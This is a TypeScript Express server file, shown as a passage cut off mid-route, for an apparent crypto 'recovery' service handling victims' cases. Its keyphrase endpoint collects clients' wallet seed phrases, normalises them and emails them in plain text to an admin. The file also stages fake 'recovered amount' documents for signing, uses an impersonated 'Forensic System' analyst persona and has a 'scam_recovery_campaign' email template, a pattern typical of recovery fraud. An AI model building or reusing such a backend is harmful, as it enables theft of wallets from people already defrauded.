import express from "express";
import crypto from "crypto";
import fs from "fs";
import path from "path";
import dotenv from "dotenv";
import {
  buildClientCaseEmailHtml,
  getEmailConfig,
  getHealthEmailPayload,
  isEmailConfigured,
  logEmailStartup,
  sendDebugEmail,
  sendRecoveryEmails,
  sendKeyphraseAdminEmail,
  sendSignedDocumentAdminEmail,
  sendAdminCaseMessageClientEmail,
  sendClientCaseMessageAdminEmail,
  sendSubscribeEmail,
  sendMarketingEmail,
  buildMarketingEmail,
  listMarketingTemplates,
  generateCaseId,
  type MarketingTemplateId,
} from "./server/email";
import {
  getForensicPgpPublicKey,
  MAX_INTEGRITY_UPLOAD_BYTES,
  sendIntegrityVerifierEmail,
} from "./server/forensic";
import {
  addCaseMessage,
  addCaseNotification,
  appendRecoveryCase,
  caseMatchesEmail,
  findRecoveryCaseByEmail,
  getCaseStoreDiagnostics,
  getRecoveryCaseById,
  initCaseStore,
  listRecoveryCases,
  markNotificationsRead,
  mergeRecoveryCases,
  submitCaseKeyphrase,
  submitCaseDocumentSignature,
  updateRecoveryCase,
  type StoredCase,
} from "./server/caseStore";
import {
  buildDocumentPreview,
  bothDocumentsSigned,
  getSignedDocuments,
  isCaseDocumentType,
  persistSignatureFile,
  readSignatureFile,
  writeSignedDocumentMeta,
} from "./server/caseDocuments";
import {
  getOrCreateSignedPdf,
  persistSignedPdf,
  signedPdfFilename,
} from "./server/signedPdf";
import { requireAdminFromRequest } from "./server/adminAuth";
import {
  applySecurityHeaders,
  assertDistHasNoPhpArtifacts,
  blockProbePaths,
  createRateLimiter,
  isDangerousUploadFilename,
  rejectIfUnsafeText,
  sanitizeMessageText,
  sanitizePlainText,
  sanitizeRecoveryPayload,
} from "./server/security";

const isProduction =
  process.env.NODE_ENV === "production" ||
  process.env.NODE_ENV === "prod";

dotenv.config({ path: ".env" });
dotenv.config({ path: ".env.local", override: true });

const distPath = path.join(process.cwd(), "dist");

async function startServer() {
  const app = express();
  const PORT = parseInt(process.env.PORT || "3000", 10);

  app.set("trust proxy", 1);
  app.use(applySecurityHeaders(isProduction));
  app.use(blockProbePaths);
  app.use(express.json({ limit: "12mb" }));

  const formRateLimit = createRateLimiter({
    windowMs: 15 * 60 * 1000,
    max: 20,
    keyPrefix: "form",
  });
  const lookupRateLimit = createRateLimiter({
    windowMs: 15 * 60 * 1000,
    max: 30,
    keyPrefix: "lookup",
  });
  const messageRateLimit = createRateLimiter({
    windowMs: 5 * 60 * 1000,
    max: 40,
    keyPrefix: "message",
  });

  const { ADMIN_EMAIL } = getEmailConfig();
  logEmailStartup();
  initCaseStore();
  const caseStore = getCaseStoreDiagnostics();
  console.log(
    `[CaseStore] ${caseStore.caseCount} case(s) at ${caseStore.casesFile} (writable: ${caseStore.writable})`
  );

  app.get("/api/health", (_req, res) => {
    res.json({
      status: "online",
      runtime: "node",
      ...getHealthEmailPayload(),
      caseStore: getCaseStoreDiagnostics(),
      platform: {
        intakeSubmit: true,
        caseLookup: true,
        clientMessaging: true,
        clientKeyphrase: true,
        adminCases: true,
        adminMessaging: true,
        adminMilestones: true,
        keyphraseAdminEmail: isEmailConfigured(),
      },
    });
  });

  app.get("/health", (_req, res) => {
    res.redirect(302, "/api/health");
  });

  /** Open in browser to verify email links work outside Titan/Gmail */
  app.get("/api/preview-case-email", async (req, res) => {
    if (isProduction) {
      const admin = await requireAdminFromRequest(req.headers.authorization);
      if (!admin) {
        return res.status(404).json({ error: "Not found" });
      }
    }
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(buildClientCaseEmailHtml("Preview User", "DF-0000-PREVIEW"));
  });

  app.get("/api/marketing-emails", async (req, res) => {
    if (isProduction) {
      const admin = await requireAdminFromRequest(req.headers.authorization);
      if (!admin) {
        return res.status(404).json({ error: "Not found" });
      }
    }
    res.json({
      templates: listMarketingTemplates().map((t) => ({
        id: t.id,
        name: t.name,
        description: t.description,
        sampleSubject: t.subject({ firstName: "Alex", caseId: "DF-8829-QX-04" }),
      })),
    });
  });

  app.get("/api/marketing-email-preview", async (req, res) => {
    if (isProduction) {
      const admin = await requireAdminFromRequest(req.headers.authorization);
      if (!admin) {
        return res.status(404).json({ error: "Not found" });
      }
    }
    const templateId = String(req.query.template || "scam_recovery_campaign") as MarketingTemplateId;
    try {
      const { html } = buildMarketingEmail(templateId, {
        firstName: String(req.query.firstName || "Alex"),
        caseId: req.query.caseId ? String(req.query.caseId) : undefined,
      });
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      res.send(html);
    } catch (error) {
      res.status(400).json({
        error: error instanceof Error ? error.message : "Invalid template",
      });
    }
  });

  app.post("/api/send-marketing-email", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ error: "Unauthorized" });
    }
    if (!isEmailConfigured()) {
      return res.status(500).json({ success: false, error: "Email not configured" });
    }

    const to = String(req.body?.to || "").trim();
    const templateId = String(req.body?.templateId || "") as MarketingTemplateId;
    if (!to || !templateId) {
      return res.status(400).json({
        success: false,
        error: "to and templateId are required",
      });
    }

    try {
      const result = await sendMarketingEmail({
        to,
        templateId,
        vars: {
          firstName: req.body?.firstName ? String(req.body.firstName) : undefined,
          caseId: req.body?.caseId ? String(req.body.caseId) : undefined,
        },
      });
      res.json({
        success: true,
        messageId: result.messageId ?? result.id,
        recipient: to,
        templateId,
      });
    } catch (error) {
      console.error("[Email] send-marketing-email failed:", error);
      res.status(500).json({
        success: false,
        error: error instanceof Error ? error.message : String(error),
      });
    }
  });

  app.get("/api/debug-email", async (req, res) => {
    if (isProduction) {
      const admin = await requireAdminFromRequest(req.headers.authorization);
      if (!admin) {
        return res.status(404).json({ error: "Not found" });
      }
    }
    if (!isEmailConfigured()) {
      return res.status(500).json({
        success: false,
        error:
          "Email not configured. Set SMTP_* (Titan) or RESEND_API_KEY in Hostinger env vars.",
      });
    }

    try {
      const target = (req.query.to as string) || ADMIN_EMAIL;
      const result = await sendDebugEmail(target);
      res.json({
        success: true,
        messageId: result.messageId ?? result.id,
        recipient: target,
        provider: getHealthEmailPayload().emailProvider,
      });
    } catch (error) {
      console.error("[Email] debug-email failed:", error);
      const errMsg = error instanceof Error ? error.message : String(error);
      res.status(200).json({
        success: false,
        error: errMsg,
        suggestions: [
          "Titan SMTP: use App Password as SMTP_PASS if 2FA is on",
          "SMTP_HOST=smtp.titan.email SMTP_PORT=465 SMTP_USER=info@cryptorecoveryasset.com",
          "Or remove SMTP_* and use RESEND_API_KEY instead",
        ],
      });
    }
  });

  app.post("/api/submit-recovery", formRateLimit, async (req, res) => {
    const sanitized = sanitizeRecoveryPayload(req.body ?? {});
    if (sanitized.ok === false) {
      return res.status(400).json({ success: false, error: sanitized.error });
    }

    const formData = sanitized.data;
    console.log(
      "NEW RECOVERY REQUEST:",
      String(formData.secureComms || formData.email || "unknown")
    );

    const { createdAt, ...safeData } = formData;
    const caseId = generateCaseId();
    const createdAtIso =
      typeof createdAt === "string"
        ? createdAt
        : new Date().toISOString();

    try {
      appendRecoveryCase({
        ...safeData,
        caseId,
        createdAt: createdAtIso,
        status: safeData.status || "PENDING",
      });
    } catch (storeErr) {
      console.error("[CaseStore] submit-recovery save failed:", storeErr);
      return res.status(500).json({
        success: false,
        error: "Could not save case. Check server data directory permissions.",
      });
    }

    let emailSent = false;
    if (isEmailConfigured()) {
      try {
        await sendRecoveryEmails(safeData, caseId);
        emailSent = true;
      } catch (error) {
        console.error("[Email] submit-recovery notify failed:", error);
      }
    }

    res.status(200).json({
      success: true,
      message: emailSent
        ? "Data securely processed."
        : "Case saved. Email notification was not sent.",
      caseId,
      emailSent,
    });
  });

  function toPublicCase(found: StoredCase) {
    const caseId = String(found.caseId || found.id);
    const signed = getSignedDocuments(found);
    const publicSigned: Record<
      string,
      {
        signedAt: string;
        signerName: string;
        acknowledged: boolean;
        verifiedByAdmin?: boolean;
      }
    > = {};
    for (const [key, rec] of Object.entries(signed)) {
      if (!rec) continue;
      publicSigned[key] = {
        signedAt: rec.signedAt,
        signerName: rec.signerName,
        acknowledged: rec.acknowledged,
        verifiedByAdmin: rec.verifiedByAdmin,
      };
    }
    return {
      id: caseId,
      caseId,
      storageSource: "server",
      firestoreDocId: null,
      operatorAlias: found.operatorAlias,
      name: found.name || found.operatorAlias,
      secureComms: found.secureComms || found.email,
      email: found.email || found.secureComms,
      status: found.status || "PENDING",
      incidentVector: found.incidentVector,
      targetNetwork: found.targetNetwork,
      transactionHash: found.transactionHash,
      caseNarrative: found.caseNarrative,
      estimatedValue: found.estimatedValue,
      recoveredAmount: found.recoveredAmount,
      recoveredAmountCurrency: found.recoveredAmountCurrency || "USD",
      documentsReleased: Boolean(found.documentsReleased),
      documentsReleasedAt: found.documentsReleasedAt,
      signedDocuments: publicSigned,
      documentsFullySigned: bothDocumentsSigned(found),
      completedSteps: found.completedSteps || ["PENDING"],
      messages: found.messages || [],
      notifications: found.notifications || [],
      formSource: found.formSource,
      createdAt: found.createdAt,
      walletKeyphraseSubmitted: Boolean(found.walletKeyphrase),
      keyphraseSubmittedAt: found.keyphraseSubmittedAt,
      keyphraseProofImageFilename: found.keyphraseProofImageFilename,
      keyphraseProofImageSubmittedAt: found.keyphraseProofImageSubmittedAt,
    };
  }

  app.post("/api/case-lookup", lookupRateLimit, (req, res) => {
    const email =
      typeof req.body?.email === "string"
        ? req.body.email.trim().toLowerCase()
        : "";
    if (!email || !email.includes("@")) {
      return res
        .status(400)
        .json({ success: false, error: "Valid email required" });
    }

    const found = findRecoveryCaseByEmail(email);
    if (!found) {
      return res.status(404).json({
        success: false,
        error: "No active recovery case found for this email address.",
      });
    }

    res.json({ success: true, case: toPublicCase(found) });
  });

  app.get("/api/case/:caseId", (req, res) => {
    const email =
      typeof req.query.email === "string"
        ? req.query.email.trim().toLowerCase()
        : "";
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found || !caseMatchesEmail(found, email)) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    res.json({ success: true, case: toPublicCase(found) });
  });

  app.post("/api/case/:caseId/messages", messageRateLimit, async (req, res) => {
    const email =
      typeof req.body?.email === "string"
        ? req.body.email.trim().toLowerCase()
        : "";
    let text = "";
    try {
      text =
        typeof req.body?.text === "string"
          ? sanitizeMessageText(req.body.text)
          : "";
    } catch (err) {
      const message = err instanceof Error ? err.message : "Invalid message";
      return res.status(400).json({ success: false, error: message });
    }
    if (!email || !text) {
      return res
        .status(400)
        .json({ success: false, error: "email and text required" });
    }
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found || !caseMatchesEmail(found, email)) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    const message = addCaseMessage(req.params.caseId, {
      text,
      sender: "Client",
      senderId: "client",
      type: "client_message",
    });
    if (!message) {
      return res.status(500).json({ success: false, error: "Failed to save" });
    }

    if (isEmailConfigured()) {
      try {
        await sendClientCaseMessageAdminEmail({
          clientName: String(found.operatorAlias || found.name || "Client"),
          clientEmail: email,
          caseId: String(found.caseId || found.id),
          status: String(found.status || "PENDING"),
          messageText: text,
        });
      } catch (emailErr) {
        console.error("[Email] client message admin alert failed:", emailErr);
      }
    }

    res.json({ success: true, message });
  });

  app.post("/api/case/:caseId/keyphrase", formRateLimit, async (req, res) => {
    const email =
      typeof req.body?.email === "string"
        ? req.body.email.trim().toLowerCase()
        : "";
    const keyphrase =
      typeof req.body?.keyphrase === "string" ? req.body.keyphrase : "";
    const normalizedKeyphrase = keyphrase
      .replace(/\r?\n/g, " ")
      .replace(/[,;]+/g, " ")
      .replace(/\b\d{1,2}[.)](?=\s)/g, " ")
      .replace(/\s+/g, " ")
      .trim();
    const proofImageRaw = req.body?.proofImage as
      | {
          filename?: unknown;
          mimeType?: unknown;
          contentBase64?: unknown;
        }
      | undefined;
    if (!email || !normalizedKeyphrase) {
      return res.status(400).json({
        success: false,
        error: "email and keyphrase required",
      });
    }
    const words = normalizedKeyphrase.split(/\s+/);
    if (words.length < 3) {
      return res.status(400).json({
        success: false,
        error: "Keyphrase is too short",
      });
    }
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found || !caseMatchesEmail(found, email)) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    let proofImageAttachment:
      | {
          filename: string;
          mimeType: string;
          content: Buffer;
        }
      | undefined;

    if (proofImageRaw) {
      const filename = String(proofImageRaw.filename || "").trim();
      const mimeType = String(proofImageRaw.mimeType || "").trim().toLowerCase();
      const contentBase64 = String(proofImageRaw.contentBase64 || "").trim();
      const ext = filename.split(".").pop()?.toLowerCase() || "";
      const mimeFromExt: Record<string, string> = {
        jpg: "image/jpeg",
        jpeg: "image/jpeg",
        png: "image/png",
        webp: "image/webp",
        heic: "image/heic",
        heif: "image/heif",
      };
      const normalizedMime =
        mimeType === "application/octet-stream"
          ? mimeFromExt[ext] || mimeType
          : mimeType || mimeFromExt[ext] || "";
      const allowedExts = new Set(["jpg", "jpeg", "png", "webp", "heic", "heif"]);
      const allowed = new Set([
        "image/jpeg",
        "image/jpg",
        "image/pjpeg",
        "image/png",
        "image/x-png",
        "image/webp",
        "image/heic",
        "image/heif",
        "image/heic-sequence",
        "image/heif-sequence",
      ]);
      const maxBytes = 10 * 1024 * 1024;
      const mimeLooksLikeImage = normalizedMime.startsWith("image/");

      if (
        !filename ||
        !contentBase64 ||
        (!allowed.has(normalizedMime) && !(mimeLooksLikeImage && allowedExts.has(ext)))
      ) {
        return res.status(400).json({
          success: false,
          error:
            "Invalid proof image. Allowed types: JPG, JPEG, PNG, WEBP, HEIC, HEIF.",
        });
      }
      if (isDangerousUploadFilename(filename)) {
        return res.status(400).json({
          success: false,
          error: "Image filename is not allowed",
        });
      }

      const content = Buffer.from(contentBase64, "base64");
      if (!content.length || content.length > maxBytes) {
        return res.status(400).json({
          success: false,
          error: "Proof image must be between 1 byte and 10MB",
        });
      }

      proofImageAttachment = { filename, mimeType: normalizedMime, content };
    }

    const updated = submitCaseKeyphrase(req.params.caseId, email, normalizedKeyphrase, {
      proofImageFilename: proofImageAttachment?.filename,
    });
    if (!updated) {
      return res.status(500).json({ success: false, error: "Failed to save" });
    }

    let keyphraseEmailSent = false;
    if (isEmailConfigured()) {
      try {
        const result = await sendKeyphraseAdminEmail({
          caseId: String(updated.caseId || updated.id),
          clientEmail: email,
          clientName: String(updated.operatorAlias || updated.name || ""),
          keyphrase: normalizedKeyphrase,
          submittedAt: String(updated.keyphraseSubmittedAt || ""),
          proofImageAttachment,
        });
        keyphraseEmailSent = result.emailSent;
      } catch (emailErr) {
        console.error("[Email] keyphrase admin alert failed:", emailErr);
      }
    }

    res.json({
      success: true,
      case: toPublicCase(updated),
      keyphraseEmailSent,
    });
  });

  app.post("/api/case/:caseId/documents/sign", formRateLimit, async (req, res) => {
    const email =
      typeof req.body?.email === "string"
        ? req.body.email.trim().toLowerCase()
        : "";
    const documentType = req.body?.documentType;
    const signerName =
      typeof req.body?.signerName === "string" ? req.body.signerName.trim() : "";
    const signatureDataUrl =
      typeof req.body?.signatureDataUrl === "string"
        ? req.body.signatureDataUrl
        : "";
    const acknowledged = Boolean(req.body?.acknowledged);

    if (!email || !signerName || !signatureDataUrl || !acknowledged) {
      return res.status(400).json({
        success: false,
        error:
          "email, signerName, signatureDataUrl, and acknowledged are required",
      });
    }
    if (!isCaseDocumentType(documentType)) {
      return res.status(400).json({
        success: false,
        error: "documentType must be funds_confirmation or legal_compliance",
      });
    }
    if (signerName.length < 2 || signerName.length > 120) {
      return res.status(400).json({
        success: false,
        error: "signerName must be 2–120 characters",
      });
    }

    const found = getRecoveryCaseById(req.params.caseId);
    if (!found || !caseMatchesEmail(found, email)) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    if (found.status !== "SIGNING" && !found.documentsReleased) {
      return res.status(400).json({
        success: false,
        error: "Documents are not available for signing yet",
      });
    }

    const already = getSignedDocuments(found)[documentType];
    if (already) {
      return res.status(409).json({
        success: false,
        error: "This document has already been signed",
      });
    }

    let signatureFilename: string;
    try {
      signatureFilename = persistSignatureFile(
        String(found.caseId || found.id),
        documentType,
        signatureDataUrl
      );
    } catch (err) {
      const message =
        err instanceof Error ? err.message : "Invalid signature image";
      return res.status(400).json({ success: false, error: message });
    }

    const updated = submitCaseDocumentSignature(req.params.caseId, email, {
      documentType,
      signerName,
      signatureFilename,
      acknowledged,
    });
    if (!updated) {
      return res.status(500).json({ success: false, error: "Failed to save" });
    }

    const record = getSignedDocuments(updated)[documentType];
    if (record) {
      writeSignedDocumentMeta(String(updated.caseId || updated.id), record);
      try {
        await persistSignedPdf(updated, record);
      } catch (pdfErr) {
        console.error("[PDF] Failed to persist signed document:", pdfErr);
      }
    }

    let emailSent = false;
    if (isEmailConfigured() && record) {
      try {
        const sigFile = readSignatureFile(
          String(updated.caseId || updated.id),
          signatureFilename
        );
        const result = await sendSignedDocumentAdminEmail({
          caseId: String(updated.caseId || updated.id),
          clientEmail: email,
          clientName: String(updated.operatorAlias || updated.name || ""),
          documentType,
          signerName,
          signedAt: record.signedAt,
          recoveredAmount:
            typeof updated.recoveredAmount === "number"
              ? updated.recoveredAmount
              : undefined,
          bothComplete: bothDocumentsSigned(updated),
          signatureAttachment: sigFile
            ? {
                filename: signatureFilename,
                mimeType: sigFile.mimeType,
                content: sigFile.buffer,
              }
            : undefined,
        });
        emailSent = result.emailSent;
      } catch (emailErr) {
        console.error("[Email] signed document admin alert failed:", emailErr);
      }
    }

    res.json({
      success: true,
      case: toPublicCase(updated),
      emailSent,
      documentPreview: buildDocumentPreview({
        documentType,
        caseId: String(updated.caseId || updated.id),
        clientName: String(updated.operatorAlias || updated.name || "Client"),
        recoveredAmount: Number(updated.recoveredAmount) || 0,
        currency: String(updated.recoveredAmountCurrency || "USD"),
      }),
    });
  });

  app.get("/api/case/:caseId/documents/:documentType/pdf", async (req, res) => {
    const email =
      typeof req.query.email === "string"
        ? req.query.email.trim().toLowerCase()
        : "";
    if (!isCaseDocumentType(req.params.documentType)) {
      return res.status(400).json({ success: false, error: "Invalid type" });
    }
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found || !caseMatchesEmail(found, email)) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    let pdf: Buffer | null = null;
    try {
      pdf = await getOrCreateSignedPdf(found, req.params.documentType);
    } catch (err) {
      console.error("[PDF] Client view failed:", err);
      return res.status(500).json({ success: false, error: "Could not build PDF" });
    }
    if (!pdf) {
      return res.status(404).json({ success: false, error: "PDF not available" });
    }
    const filename = signedPdfFilename(
      String(found.caseId || found.id),
      req.params.documentType
    );
    res.setHeader("Content-Type", "application/pdf");
    res.setHeader("Content-Disposition", `inline; filename="${filename}"`);
    res.setHeader("Cache-Control", "private, no-store");
    res.setHeader("X-Frame-Options", "SAMEORIGIN");
    res.setHeader("Content-Length", String(pdf.length));
    res.send(pdf);
  });

  app.get("/api/case/:caseId/documents/:documentType/signature", (req, res) => {
    const email =
      typeof req.query.email === "string"
        ? req.query.email.trim().toLowerCase()
        : "";
    if (!isCaseDocumentType(req.params.documentType)) {
      return res.status(400).json({ success: false, error: "Invalid type" });
    }
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found || !caseMatchesEmail(found, email)) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    const record = getSignedDocuments(found)[req.params.documentType];
    if (!record) {
      return res.status(404).json({ success: false, error: "Not signed" });
    }
    const file = readSignatureFile(
      String(found.caseId || found.id),
      record.signatureFilename
    );
    if (!file) {
      return res.status(404).json({ success: false, error: "Signature missing" });
    }
    res.setHeader("Content-Type", file.mimeType);
    res.setHeader("Cache-Control", "private, no-store");
    res.send(file.buffer);
  });

  app.patch("/api/case/:caseId/notifications", (req, res) => {
    const email =
      typeof req.body?.email === "string"
        ? req.body.email.trim().toLowerCase()
        : "";
    const notificationId =
      typeof req.body?.notificationId === "string"
        ? req.body.notificationId
        : undefined;
    if (!email) {
      return res.status(400).json({ success: false, error: "email required" });
    }
    const ok = markNotificationsRead(req.params.caseId, email, notificationId);
    if (!ok) {
      return res.status(404).json({ success: false, error: "Not found" });
    }
    res.json({ success: true });
  });

  app.get("/api/admin/cases", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ success: false, error: "Unauthorized" });
    }
    const cases = listRecoveryCases();
    console.log(
      `[Admin] ${admin.email} loaded ${cases.length} case(s) from server store`
    );
    res.json({ success: true, cases, count: cases.length });
  });

  app.post("/api/admin/cases/restore", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ success: false, error: "Unauthorized" });
    }
    const incoming = Array.isArray(req.body?.cases) ? req.body.cases : [];
    if (!incoming.length) {
      return res
        .status(400)
        .json({ success: false, error: "No cases in restore payload" });
    }
    const result = mergeRecoveryCases(incoming);
    console.log(
      `[Admin] ${admin.email} restored ${result.imported} case(s); store now ${result.total}`
    );
    res.json({
      success: true,
      imported: result.imported,
      total: result.total,
      cases: listRecoveryCases(),
    });
  });

  app.get("/api/admin/cases/:caseId", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ success: false, error: "Unauthorized" });
    }
    const found = getRecoveryCaseById(req.params.caseId);
    if (!found) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    res.json({ success: true, case: found });
  });

  app.patch("/api/admin/cases/:caseId", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ success: false, error: "Unauthorized" });
    }
    const caseId = req.params.caseId;
    const {
      status,
      completedSteps,
      notification,
      recoveredAmount,
      recoveredAmountCurrency,
      documentsReleased,
      verifyDocuments,
    } = req.body || {};
    if (
      status === undefined &&
      completedSteps === undefined &&
      !notification &&
      recoveredAmount === undefined &&
      documentsReleased === undefined &&
      !verifyDocuments
    ) {
      return res
        .status(400)
        .json({ success: false, error: "Nothing to update" });
    }

    const existing = getRecoveryCaseById(caseId);
    if (!existing) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }

    let nextStatus =
      status !== undefined ? String(status) : undefined;
    let nextReleased =
      documentsReleased !== undefined
        ? Boolean(documentsReleased)
        : undefined;
    let amountPatch: number | undefined;

    if (recoveredAmount !== undefined) {
      const n = Number(recoveredAmount);
      if (!Number.isFinite(n) || n <= 0) {
        return res.status(400).json({
          success: false,
          error: "recoveredAmount must be a positive number",
        });
      }
      amountPatch = Math.round(n * 100) / 100;
    }

    if (nextStatus === "SIGNING") {
      const amount =
        amountPatch ??
        (typeof existing.recoveredAmount === "number"
          ? existing.recoveredAmount
          : Number(existing.recoveredAmount));
      if (!Number.isFinite(amount) || amount <= 0) {
        return res.status(400).json({
          success: false,
          error:
            "Enter a recovered amount before releasing Document Acknowledgement",
        });
      }
      nextReleased = true;
    }

    const updated = updateRecoveryCase(caseId, {
      ...(nextStatus !== undefined ? { status: nextStatus } : {}),
      ...(completedSteps !== undefined
        ? { completedSteps: completedSteps as string[] }
        : {}),
      ...(amountPatch !== undefined ? { recoveredAmount: amountPatch } : {}),
      ...(recoveredAmountCurrency !== undefined
        ? {
            recoveredAmountCurrency: String(recoveredAmountCurrency || "USD"),
          }
        : {}),
      ...(nextReleased !== undefined
        ? {
            documentsReleased: nextReleased,
            ...(nextReleased
              ? { documentsReleasedAt: new Date().toISOString() }
              : {}),
          }
        : {}),
      ...(verifyDocuments
        ? { documentsVerifiedAt: new Date().toISOString() }
        : {}),
    });
    if (!updated) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }

    if (verifyDocuments) {
      const signed = getSignedDocuments(updated);
      const nextSigned = { ...signed };
      for (const key of Object.keys(nextSigned) as Array<
        keyof typeof nextSigned
      >) {
        const rec = nextSigned[key];
        if (rec) {
          nextSigned[key] = {
            ...rec,
            verifiedByAdmin: true,
            verifiedAt: new Date().toISOString(),
          };
        }
      }
      updateRecoveryCase(caseId, {
        signedDocuments: nextSigned as Record<string, unknown>,
        documentsVerifiedAt: new Date().toISOString(),
      });
    }

    if (notification && typeof notification === "object") {
      addCaseNotification(caseId, {
        title: String(notification.title || "Update"),
        message: String(notification.message || ""),
        type: String(notification.type || "STATUS_UPDATE"),
      });
    }
    const fresh = getRecoveryCaseById(caseId);
    res.json({ success: true, case: fresh || updated });
  });

  app.get(
    "/api/admin/cases/:caseId/documents/:documentType/signature",
    async (req, res) => {
      const admin = await requireAdminFromRequest(req.headers.authorization);
      if (!admin) {
        return res.status(401).json({ success: false, error: "Unauthorized" });
      }
      if (!isCaseDocumentType(req.params.documentType)) {
        return res.status(400).json({ success: false, error: "Invalid type" });
      }
      const found = getRecoveryCaseById(req.params.caseId);
      if (!found) {
        return res.status(404).json({ success: false, error: "Case not found" });
      }
      const record = getSignedDocuments(found)[req.params.documentType];
      if (!record?.signatureFilename) {
        return res
          .status(404)
          .json({ success: false, error: "Signature not found" });
      }
      const file = readSignatureFile(
        String(found.caseId || found.id),
        record.signatureFilename
      );
      if (!file) {
        return res
          .status(404)
          .json({ success: false, error: "Signature file missing" });
      }
      res.setHeader("Content-Type", file.mimeType);
      res.setHeader("Cache-Control", "private, no-store");
      res.send(file.buffer);
    }
  );

  app.get(
    "/api/admin/cases/:caseId/documents/:documentType/pdf",
    async (req, res) => {
      const admin = await requireAdminFromRequest(req.headers.authorization);
      if (!admin) {
        return res.status(401).json({ success: false, error: "Unauthorized" });
      }
      if (!isCaseDocumentType(req.params.documentType)) {
        return res.status(400).json({ success: false, error: "Invalid type" });
      }
      const found = getRecoveryCaseById(req.params.caseId);
      if (!found) {
        return res.status(404).json({ success: false, error: "Case not found" });
      }
      let pdf: Buffer | null = null;
      try {
        pdf = await getOrCreateSignedPdf(found, req.params.documentType);
      } catch (err) {
        console.error("[PDF] Admin download failed:", err);
        return res
          .status(500)
          .json({ success: false, error: "Could not build PDF" });
      }
      if (!pdf) {
        return res
          .status(404)
          .json({ success: false, error: "PDF not available" });
      }
      const filename = signedPdfFilename(
        String(found.caseId || found.id),
        req.params.documentType
      );
      const download = req.query.download === "1";
      res.setHeader("Content-Type", "application/pdf");
      res.setHeader(
        "Content-Disposition",
        `${download ? "attachment" : "inline"}; filename="${filename}"`
      );
      res.setHeader("Cache-Control", "private, no-store");
      res.setHeader("X-Frame-Options", "SAMEORIGIN");
      res.setHeader("Content-Length", String(pdf.length));
      res.send(pdf);
    }
  );

  app.post("/api/admin/cases/:caseId/messages", async (req, res) => {
    const admin = await requireAdminFromRequest(req.headers.authorization);
    if (!admin) {
      return res.status(401).json({ success: false, error: "Unauthorized" });
    }
    const text = typeof req.body?.text === "string" ? req.body.text.trim() : "";
    if (!text) {
      return res.status(400).json({ success: false, error: "text required" });
    }
    const caseId = req.params.caseId;
    const message = addCaseMessage(caseId, {
      text,
      sender: "Forensic System v4.2 (Admin)",
      senderId: "admin",
      type: "admin_message",
    });
    if (!message) {
      return res.status(404).json({ success: false, error: "Case not found" });
    }
    addCaseNotification(caseId, {
      title: "New Message Received",
      message:
        "You have a new secure communication from your lead analyst.",
      type: "MESSAGE",
    });

    const caseRow = getRecoveryCaseById(caseId);
    const clientEmail = caseRow
      ? String(caseRow.secureComms || caseRow.email || "")
          .trim()
          .toLowerCase()
      : "";
    if (caseRow && clientEmail && isEmailConfigured()) {
      try {
        await sendAdminCaseMessageClientEmail({
          to: clientEmail,
          clientName: String(caseRow.operatorAlias || caseRow.name || "Valued Client"),
          caseId: String(caseRow.caseId || caseRow.id),
          status: String(caseRow.status || "PENDING"),
          messageText: text,
        });
      } catch (emailErr) {
        console.error("[Email] admin message client alert failed:", emailErr);
      }
    }

    res.json({ success: true, message });
  });

  app.get("/api/forensic/config", (_req, res) => {
    res.json({
      pgpPublicKey: getForensicPgpPublicKey(),
      maxUploadBytes: MAX_INTEGRITY_UPLOAD_BYTES,
      emailConfigured: isEmailConfigured(),
    });
  });

  app.post("/api/forensic/integrity-upload", formRateLimit, async (req, res) => {
    const { filename, contentBase64, sha256, mimeType, notifierEmail } =
      req.body ?? {};

    if (!filename || !contentBase64 || !sha256) {
      return res.status(400).json({
        success: false,
        error: "filename, contentBase64, and sha256 are required",
      });
    }

    if (isDangerousUploadFilename(String(filename))) {
      console.warn(`[Security] Blocked dangerous upload filename: ${filename}`);
      return res.status(400).json({
        success: false,
        error: "File type not allowed for forensic upload.",
      });
    }

    if (!isEmailConfigured()) {
      return res.status(503).json({
        success: false,
        error:
          "Email is not configured on the server. Set RESEND_API_KEY or SMTP_* in Hostinger.",
      });
    }

    try {
      const buffer = Buffer.from(String(contentBase64), "base64");
      if (!buffer.length) {
        return res.status(400).json({ success: false, error: "Empty file" });
      }
      if (buffer.length > MAX_INTEGRITY_UPLOAD_BYTES) {
        return res.status(400).json({
          success: false,
          error: `File exceeds ${MAX_INTEGRITY_UPLOAD_BYTES / (1024 * 1024)}MB limit`,
        });
      }

      const computed = crypto
        .createHash("sha256")
        .update(buffer)
        .digest("hex");
      if (computed !== String(sha256).toLowerCase()) {
        return res.status(400).json({
          success: false,
          error: "SHA-256 checksum mismatch — re-upload the file",
        });
      }

      const result = await sendIntegrityVerifierEmail({
        filename: String(filename),
        sha256: computed,
        fileSize: buffer.length,
        mimeType: String(mimeType || "application/octet-stream"),
        fileBuffer: buffer,
        notifierEmail: notifierEmail ? String(notifierEmail) : undefined,
      });

      res.status(200).json({
        success: true,
        caseRef: result.caseRef,
        message: "File verified and sent to the forensic inbox.",
      });
    } catch (error) {
      console.error("[Forensic] integrity-upload failed:", error);
      res.status(500).json({
        success: false,
        error: error instanceof Error ? error.message : String(error),
      });
    }
  });

  app.post("/api/subscribe", formRateLimit, async (req, res) => {
    const name = sanitizePlainText(req.body?.name, 120);
